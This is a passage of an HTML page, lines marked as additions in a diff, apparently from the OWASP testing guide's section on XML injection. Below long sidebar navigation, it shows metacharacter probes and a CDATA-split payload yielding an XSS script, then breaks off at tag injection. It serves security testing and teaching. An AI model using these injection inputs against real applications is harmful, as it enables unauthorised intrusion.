+<a href="/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Cryptographic_Primitives" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Cryptographic_Primitives" title="4.9.4 Testing for Weak Cryptographic Primitives">4.9.4 Testing for Weak Cryptographic Primitives</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.10 Business Logic Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/" title="4.10 Business Logic Testing">4.10 Business Logic Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.10.0 Introduction to Business Logic">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic" title="4.10.0 Introduction to Business Logic">4.10.0 Introduction to Business Logic</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.1 Test Business Logic Data Validation" data-hints="wstg-busl-01 busl-01">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation" title="4.10.1 Test Business Logic Data Validation">4.10.1 Test Business Logic Data Validation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.2 Test Ability to Forge Requests" data-hints="wstg-busl-02 busl-02">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests" title="4.10.2 Test Ability to Forge Requests">4.10.2 Test Ability to Forge Requests</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.3 Test Integrity Checks" data-hints="wstg-busl-03 busl-03">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks" title="4.10.3 Test Integrity Checks">4.10.3 Test Integrity Checks</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.4 Test for Process Timing" data-hints="race condition toctou wstg-busl-04 busl-04">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing" title="4.10.4 Test for Process Timing">4.10.4 Test for Process Timing</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.5 Test Number of Times a Function Can Be Used Limits" data-hints="rate limit bruteforce brute force wstg-busl-05 busl-05">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits" title="4.10.5 Test Number of Times a Function Can Be Used Limits">4.10.5 Test Number of Times a Function Can Be Used Limits</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.6 Testing for the Circumvention of Work Flows" data-hints="wstg-busl-06 busl-06">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows" title="4.10.6 Testing for the Circumvention of Work Flows">4.10.6 Testing for the Circumvention of Work Flows</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.7 Test Defenses Against Application Misuse" data-hints="wstg-busl-07 busl-07">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse" title="4.10.7 Test Defenses Against Application Misuse">4.10.7 Test Defenses Against Application Misuse</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.8 Test Upload of Unexpected File Types" data-hints="wstg-busl-08 busl-08">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types" title="4.10.8 Test Upload of Unexpected File Types">4.10.8 Test Upload of Unexpected File Types</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.9 Test Upload of Malicious Files" data-hints="wstg-busl-09 busl-09">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files" title="4.10.9 Test Upload of Malicious Files">4.10.9 Test Upload of Malicious Files</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.10 Test Payment Functionality" data-hints="wstg-busl-10 busl-10">
+<a href="/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality" title="4.10.10 Test Payment Functionality">4.10.10 Test Payment Functionality</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.11 Client-side Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/" title="4.11 Client-side Testing">4.11 Client-side Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.11.1 Testing for DOM-Based Cross Site Scripting" data-hints="xss dom xss domxss wstg-clnt-01 clnt-01">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting" title="4.11.1 Testing for DOM-Based Cross Site Scripting">4.11.1 Testing for DOM-Based Cross Site Scripting</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.11.1.1 Testing for Self DOM Based Cross-Site Scripting" data-hints="xss dom xss domxss">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting" title="4.11.1.1 Testing for Self DOM Based Cross-Site Scripting">4.11.1.1 Testing for Self DOM Based Cross-Site Scripting</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.11.2 Testing for JavaScript Execution" data-hints="wstg-clnt-02 clnt-02">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution" title="4.11.2 Testing for JavaScript Execution">4.11.2 Testing for JavaScript Execution</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.3 Testing for HTML Injection" data-hints="wstg-clnt-03 clnt-03">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" title="4.11.3 Testing for HTML Injection">4.11.3 Testing for HTML Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.4 Testing for Client-side URL Redirect" data-hints="open redirect wstg-clnt-04 clnt-04">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect" title="4.11.4 Testing for Client-side URL Redirect">4.11.4 Testing for Client-side URL Redirect</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.5 Testing for CSS Injection" data-hints="wstg-clnt-05 clnt-05">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection" title="4.11.5 Testing for CSS Injection">4.11.5 Testing for CSS Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.6 Testing for Client-side Resource Manipulation" data-hints="wstg-clnt-06 clnt-06">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation" title="4.11.6 Testing for Client-side Resource Manipulation">4.11.6 Testing for Client-side Resource Manipulation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.7 Testing Cross Origin Resource Sharing" data-hints="cors headers wstg-clnt-07 clnt-07">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing" title="4.11.7 Testing Cross Origin Resource Sharing">4.11.7 Testing Cross Origin Resource Sharing</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.8 Testing for Cross Site Flashing" data-hints="wstg-clnt-08 clnt-08">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing" title="4.11.8 Testing for Cross Site Flashing">4.11.8 Testing for Cross Site Flashing</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.9 Testing for Clickjacking" data-hints="ui redress ui redressing x-frame-options framing wstg-clnt-09 clnt-09">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking" title="4.11.9 Testing for Clickjacking">4.11.9 Testing for Clickjacking</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.10 Testing WebSockets" data-hints="ws wstg-clnt-10 clnt-10">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets" title="4.11.10 Testing WebSockets">4.11.10 Testing WebSockets</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.11 Testing Web Messaging" data-hints="postmessage post message wstg-clnt-11 clnt-11">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging" title="4.11.11 Testing Web Messaging">4.11.11 Testing Web Messaging</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.12 Testing Browser Storage" data-hints="localstorage sessionstorage wstg-clnt-12 clnt-12">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage" title="4.11.12 Testing Browser Storage">4.11.12 Testing Browser Storage</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.13 Testing for Cross Site Script Inclusion" data-hints="xssi wstg-clnt-13 clnt-13">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion" title="4.11.13 Testing for Cross Site Script Inclusion">4.11.13 Testing for Cross Site Script Inclusion</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.14 Testing for Reverse Tabnabbing" data-hints="tabnabbing window.opener wstg-clnt-14 clnt-14">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing" title="4.11.14 Testing for Reverse Tabnabbing">4.11.14 Testing for Reverse Tabnabbing</a>
+</li>
+<li class="wstg-nav-item" data-title="4.11.15 Testing for Client-side Template Injection" data-hints="csti wstg-clnt-15 clnt-15">
+<a href="/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection" data-nav-url="4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection" title="4.11.15 Testing for Client-side Template Injection">4.11.15 Testing for Client-side Template Injection</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.12 API Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/4-Web_Application_Security_Testing/12-API_Testing/" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/" title="4.12 API Testing">4.12 API Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.12.0 API Testing Overview">
+<a href="/latest/4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview" title="4.12.0 API Testing Overview">4.12.0 API Testing Overview</a>
+</li>
+<li class="wstg-nav-item" data-title="4.12.1 API Reconnaissance" data-hints="wstg-apit-01 apit-01">
+<a href="/latest/4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance" title="4.12.1 API Reconnaissance">4.12.1 API Reconnaissance</a>
+</li>
+<li class="wstg-nav-item" data-title="4.12.2 API Broken Object Level Authorization" data-hints="bola idor wstg-apit-02 apit-02">
+<a href="/latest/4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization" title="4.12.2 API Broken Object Level Authorization">4.12.2 API Broken Object Level Authorization</a>
+</li>
+<li class="wstg-nav-item" data-title="4.12.3 Testing for Excessive Data Exposure" data-hints="wstg-apit-03 apit-03">
+<a href="/latest/4-Web_Application_Security_Testing/12-API_Testing/03-Testing_for_Excessive_Data_Exposure" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/03-Testing_for_Excessive_Data_Exposure" title="4.12.3 Testing for Excessive Data Exposure">4.12.3 Testing for Excessive Data Exposure</a>
+</li>
+<li class="wstg-nav-item" data-title="4.12.4 API Broken Function Level Authorization" data-hints="bfla wstg-apit-04 apit-04">
+<a href="/latest/4-Web_Application_Security_Testing/12-API_Testing/04-API_Broken_Function_Level_Authorization" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/04-API_Broken_Function_Level_Authorization" title="4.12.4 API Broken Function Level Authorization">4.12.4 API Broken Function Level Authorization</a>
+</li>
+<li class="wstg-nav-item" data-title="4.12.99 Testing GraphQL" data-hints="gql wstg-apit-99 apit-99">
+<a href="/latest/4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL" data-nav-url="4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL" title="4.12.99 Testing GraphQL">4.12.99 Testing GraphQL</a>
+</li>
+</ul>
+</details>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="5. Reporting">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/latest/5-Reporting/" data-nav-url="5-Reporting/" title="5. Reporting">5. Reporting</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="5.1 Reporting Structure">
+<a href="/latest/5-Reporting/01-Reporting_Structure" data-nav-url="5-Reporting/01-Reporting_Structure" title="5.1 Reporting Structure">5.1 Reporting Structure</a>
+</li>
+<li class="wstg-nav-item" data-title="5.2 Naming Schemes">
+<a href="/latest/5-Reporting/02-Naming_Schemes" data-nav-url="5-Reporting/02-Naming_Schemes" title="5.2 Naming Schemes">5.2 Naming Schemes</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="Appendix A. History">
+<a href="/latest/6-Appendix/A-History" data-nav-url="6-Appendix/A-History" title="Appendix A. History">Appendix A. History</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix B. Testing Tools Resource">
+<a href="/latest/6-Appendix/B-Testing_Tools_Resource" data-nav-url="6-Appendix/B-Testing_Tools_Resource" title="Appendix B. Testing Tools Resource">Appendix B. Testing Tools Resource</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix C. Suggested Reading">
+<a href="/latest/6-Appendix/C-Suggested_Reading" data-nav-url="6-Appendix/C-Suggested_Reading" title="Appendix C. Suggested Reading">Appendix C. Suggested Reading</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix D. Fuzzing">
+<a href="/latest/6-Appendix/D-Fuzzing" data-nav-url="6-Appendix/D-Fuzzing" title="Appendix D. Fuzzing">Appendix D. Fuzzing</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix E. Encoded Injection">
+<a href="/latest/6-Appendix/E-Encoded_Injection" data-nav-url="6-Appendix/E-Encoded_Injection" title="Appendix E. Encoded Injection">Appendix E. Encoded Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="Appendix F. Leveraging Dev Tools">
+<a href="/latest/6-Appendix/F-Leveraging_Dev_Tools" data-nav-url="6-Appendix/F-Leveraging_Dev_Tools" title="Appendix F. Leveraging Dev Tools">Appendix F. Leveraging Dev Tools</a>
+</li>
+
+  </ul>
+</nav>
+<script src="/assets/js/wstg-nav.js" defer></script>
+<script src="/assets/js/anchor-links.js" defer></script>
+
+      </aside>
+      <article class="doc-content">
+        <h1 id="testing-for-xml-injection">Testing for XML Injection</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>ID</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>WSTG-INPV-07</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="summary">Summary</h2>
+
+<p>XML Injection testing is when a tester tries to inject or manipulate an XML document within an application. If the XML parser fails to contextually validate data or is insecurely configured, the test will yield a positive result.</p>
+
+<p>This section describes practical examples of XML Injection. First, an XML-based communication API will be defined and its working principles explained. Then, the discovery method is demonstrated, in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have information about the XML structure, making it possible to inject XML data and tags (Tag Injection), or exploit the parser’s configuration to access local and remote resources (XML External Entity / XXE Injection).</p>
+
+<h2 id="test-objectives">Test Objectives</h2>
+
+<ul>
+  <li>Identify XML injection points.</li>
+  <li>Assess the types of exploits that can be attained and their severities.</li>
+</ul>
+
+<h2 id="how-to-test">How to Test</h2>
+
+<p>Let’s suppose there is a modern web application or web service (such as a SOAP or RESTful API) that accepts XML formatting for user registration.</p>
+
+<p>When a user registers by filling out an HTML form or interacting with a client application, the application sends the user’s data in a <code class="language-plaintext highlighter-rouge">POST</code> request containing an XML payload:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/api/addUser</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.example.com</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/xml</span>
+
+<span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+<span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
+    <span class="nt">&lt;email&gt;</span>s4tan@hell.com<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+
+<p>The backend application parses this XML payload and inserts the parsed values into the database or internal state (often augmenting it with server-generated fields such as <code class="language-plaintext highlighter-rouge">userid</code>). If the application dynamically constructs XML responses or forwards this XML data to another backend system by concatenating strings without proper sanitization, it becomes vulnerable to XML structural injection. Alternatively, if the XML parser itself is insecurely configured, it becomes vulnerable to entity-based attacks (XXE).</p>
+
+<h3 id="discovery">Discovery</h3>
+
+<p>The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.</p>
+
+<p>XML metacharacters are:</p>
+
+<ul>
+  <li>Single and Double Quotes (<code class="language-plaintext highlighter-rouge">'</code> and <code class="language-plaintext highlighter-rouge">"</code>): When not sanitized, these characters can throw an exception during XML parsing or allow an attacker to prematurely close an attribute. This occurs when the injected quote matches the character used to enclose the attribute value.</li>
+</ul>
+
+<p>For example, let’s suppose an application uses single quotes for attributes:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;node attrib='$inputValue'/&gt;</code></p>
+
+<p>If the payload <code class="language-plaintext highlighter-rouge">$inputValue = foo'</code> is provided, the resulting XML becomes:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;node attrib='foo''/&gt;</code></p>
+
+<p>The resulting XML document is malformed and invalid. The exact same logic applies to double quotes (<code class="language-plaintext highlighter-rouge">"</code>) if the attribute is enclosed in double quotes (e.g., <code class="language-plaintext highlighter-rouge">&lt;node attrib="$inputValue"/&gt;</code>).</p>
+
+<ul>
+  <li>Angular parentheses: <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;</code> - By adding an open or closed angular parenthesis in a user input like the following:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Username = foo&lt;</code></p>
+
+<p>the application will build a new node:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span>foo<span class="err">&lt;</span><span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
+    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
+    <span class="nt">&lt;email&gt;</span>s4tan@hell.com<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+
+<p>but, because of the presence of the open ‘&lt;’, the resulting XML document is invalid.</p>
+
+<ul>
+  <li>Comment tag: <code class="language-plaintext highlighter-rouge">&lt;!--</code> and <code class="language-plaintext highlighter-rouge">--&gt;</code> - This sequence of characters is interpreted as the beginning or end of a comment. So by injecting one of them in Username parameter:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Username = foo&lt;!--</code></p>
+
+<p>the application will build a node like the following:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span>foo<span class="c">&lt;!--&lt;/username&gt;
+    &lt;password&gt;Un6R34kb!e&lt;/password&gt;
+    &lt;userid&gt;500&lt;/userid&gt;
+    &lt;email&gt;s4tan@hell.com&lt;/email&gt;
+&lt;/user&gt;
+</span></code></pre></div></div>
+
+<p>which won’t be a valid XML sequence.</p>
+
+<ul>
+  <li>Ampersand: <code class="language-plaintext highlighter-rouge">&amp;</code>- The ampersand is used in the XML syntax to represent entities. The format of an entity is <code class="language-plaintext highlighter-rouge">&amp;symbol;</code>. An entity is mapped to a character in the Unicode character set.</li>
+</ul>
+
+<p>For example:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;tagnode&gt;&amp;lt;&lt;/tagnode&gt;</code></p>
+
+<p>is well formed and valid, and represents the <code class="language-plaintext highlighter-rouge">&lt;</code> ASCII character.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">&amp;</code> is not encoded itself with <code class="language-plaintext highlighter-rouge">&amp;amp;</code>, it could be used to test XML injection.</p>
+
+<p>In fact, if an input like the following is provided:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Username = &amp;foo</code></p>
+
+<p>a new node will be created:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span><span class="err">&amp;</span>foo<span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
+    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
+    <span class="nt">&lt;email&gt;</span>s4tan@hell.com<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+
+<p>but, again, the document is not valid: <code class="language-plaintext highlighter-rouge">&amp;foo</code> is not terminated with <code class="language-plaintext highlighter-rouge">;</code> and the <code class="language-plaintext highlighter-rouge">&amp;foo;</code> entity is undefined.</p>
+
+<ul>
+  <li>CDATA section delimiters: <code class="language-plaintext highlighter-rouge">&lt;![CDATA[</code> and <code class="language-plaintext highlighter-rouge">]]&gt;</code> - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.</li>
+</ul>
+
+<p>For example, if there is the need to represent the string <code class="language-plaintext highlighter-rouge">&lt;foo&gt;</code> inside a text node, a CDATA section may be used:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;node&gt;</span>
+    <span class="cp">&lt;![CDATA[&lt;foo&gt;]]&gt;</span>
+<span class="nt">&lt;/node&gt;</span>
+</code></pre></div></div>
+
+<p>so that <code class="language-plaintext highlighter-rouge">&lt;foo&gt;</code> won’t be parsed as markup and will be considered as character data.</p>
+
+<p>If a node is created in the following way:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;username&gt;&lt;![CDATA[&lt;$userName]]&gt;&lt;/username&gt;</code></p>
+
+<p>the tester could try to inject the end CDATA string <code class="language-plaintext highlighter-rouge">]]&gt;</code> in order to try to invalidate the XML document.</p>
+
+<p><code class="language-plaintext highlighter-rouge">userName = ]]&gt;</code></p>
+
+<p>this will become:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;username&gt;&lt;![CDATA[]]&gt;]]&gt;&lt;/username&gt;</code></p>
+
+<p>which is not a valid XML fragment.</p>
+
+<p>Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.</p>
+
+<p>Let’s consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+    $HTMLCode
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Then, an attacker can provide the following input:</p>
+
+<pre><code class="language-txt">&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;
+</code></pre>
+
+<p>and obtain the following node:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+    <span class="cp">&lt;![CDATA[&lt;]]&gt;</span>script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>alert('xss')<span class="cp">&lt;![CDATA[&lt;]]&gt;</span>/script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+    <span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>The result is that the application is vulnerable to XSS.</p>
+
+<h3 id="tag-injection">Tag Injection</h3>
+
+<p>Once the first step is accomplished and the tester maps the XML structure, it is possible to try to inject complete XML tags. This can lead to logic bypasses or privilege escalation if the application uses the parsed XML to make authorization decisions.</p>
+
+<p>Let’s consider a scenario where the user’s input is concatenated directly into a backend XML request. The application dynamically builds the following XML node to communicate with an internal service:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
+    <span class="nt">&lt;username&gt;</span>$username<span class="nt">&lt;/username&gt;</span>
+    <span class="nt">&lt;password&gt;</span>$password<span class="nt">&lt;/password&gt;</span>
+    <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
+    <span class="nt">&lt;email&gt;</span>$email<span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;/user&gt;</span>
+</code></pre></div></div>
+
+<p>By manipulating the $email input field, the tester can inject a closing tag for the current element and start a new one. If the injected input is:</p>
+
